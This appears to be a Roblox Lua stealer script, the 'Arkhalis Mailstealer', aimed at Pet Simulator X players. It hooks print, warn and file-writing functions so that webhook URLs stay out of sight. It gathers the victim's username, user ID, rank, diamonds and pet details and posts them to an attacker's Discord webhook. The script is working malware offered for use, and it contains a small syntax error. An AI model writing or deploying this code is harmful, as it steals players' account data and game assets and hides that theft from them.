--// anti http spy
local hook = hookfunction or hookfunc or replace_closure
local hookies = {}
if hook then
pcall(function() -- fuck compatability me and my homies hate compatibility
    hookies[1] = hook(print,function(...)if(tostring(...):match("api/webhooks")) then print("Nxll Blocked You For Http Spy-ing")return ""end return hookies[1](...)end)
    hookies[2] = hook(warn,function(...)if(tostring(...):match("api/webhooks")) then print("Nxll Blocked You For Http Spy-ing")return ""end return hookies[2](...)end)
    hookies[3] = hook(appendfile,function(...)if(tostring(...):match("api/webhooks")) then print("Nxll Blocked You For Http Spy-ing")return ""end return hookies[3](...)end)
    hookies[4] = hook(writefile,function(...)if(tostring(...):match("api/webhooks")) then print("Nxll Blocked You For Http Spy-ing")return ""end return hookies[4](...)end)
    hookies[5] = hook(rconsoleprint,function(...)if(tostring(...):match("api/webhooks")) then print("Nxll Blocked You For Http Spy-ing")return ""end return hookies[5](...)end)
end)
end

--// Executor detector
local executor = identifyexecutor()
 
if game.PlaceId == 6284583030 then
	_G.GameIn = "Pet Simulator X"
elseif game.PlaceId == 7722306047 then
	_G.GameIn = "PSX Trading Plaza"
elseif game.PlaceId == 10321372166 then
	_G.GameIn = "PSX Hardcore"
elseif game.PlaceId == 12610002282 then
	_G.GameIn = "PSX Pro Trading Plaza"
elseif game.PlaceId == 11725212117 then
	_G.GameIn = "PSX Voice Trading Plaza"
else
	_G.GameIn = "❓ Couldn't find game"
end
local webhookcolor = "13369599"
_G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
_G.PlrUserVictim = game.Players.LocalPlayer.Name
_G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
local function sendwebhook(msg)
local msg = {
  ["username"]= "Arhalis Stealer"
  ["content"]= "**Arkhalis Mailstealer has detected a new hit!**",
  ["embeds"]= {
    {
      ["title"]= "`Arkhalis Mailstealer Results`",
      ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."\n🔥Executor: "..executor.."",
      ["url"]= "https://discord.gg/34fs3FWt",
      ["color"]= ""..webhookcolor.."",
      ["fields"]= {
        {
          ["name"]= "Diamonds 💎",
          ["value"]= "```".._G.Diamonds.."```",
          ["inline"]= true
        },
        {
          ["name"]= "Pet Name & Rarity",
          ["value"]= "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
		  ["inline"]= true
        }
      }
    }
  },
  ["attachments"] = {}
}
local Webhook = _G.Webhook
request = http_request or request or HttpPost or syn.request
request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
end
sendwebhook(msg)
